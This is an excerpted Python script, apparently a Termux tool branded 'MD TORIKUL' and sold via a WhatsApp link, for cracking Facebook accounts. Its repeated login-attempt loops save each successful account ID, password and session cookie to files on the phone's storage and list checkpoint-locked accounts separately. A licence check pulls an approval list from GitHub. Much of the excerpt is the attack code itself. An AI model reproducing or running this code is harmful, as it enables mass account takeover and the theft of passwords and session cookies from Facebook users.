...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO EVERYONE         ')
...
totaldmp = 0
filter = []
sys.stdout.write('\x1b]2; MD TORIKUL\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
$$ |  $$ |$$ |        \$$$  /    $$ |  $$ |            
$$$$$$$  |$$$$$$$$\    \$  /   $$$$$$\ $$$$$$$$\       
\_______/ \________|    \_/    \______|\_____
                                 
                                                                 
__________________________________________________

 \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MD TORIKUL\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :          MD TORIKUL 
\033[1;92m Facebook:           bartho jibon
\033[1;92m Github  :            mdtarik417
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back TORIKUL Menu ")
        exit()
def menu():   
    os.system('clear')
    print(logo)
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)                 
                    open('/sdcard/TORIKUL/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SIAM/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\x1b[1;96m [TORIKUL-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/TORIKUL/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/TORIKUL/OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JAS/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\x1b[1;96m [TORIKUL-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/TORIKUL/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//TORIKUL/OK_ids_M3.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/JAS/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\x1b[1;96m [TORIKUL-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/TORIKUL/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/TORIKUL/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/JAS/COOKiEs_M4.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                      #print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                    #cps.append(sid)
                    open('/sdcard//TORIKUL/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
def main_apv():
    ...
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://github.com/Mdtaeik417/Devil-2/blob/main/Devil-2.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            ...
            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : TORIKUL Tools Can buy in all countries!')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            ...
            print("-----------------------------------------------------")
            url_wa = "https://api.whatsapp.com/send?phone=01757197599&text="
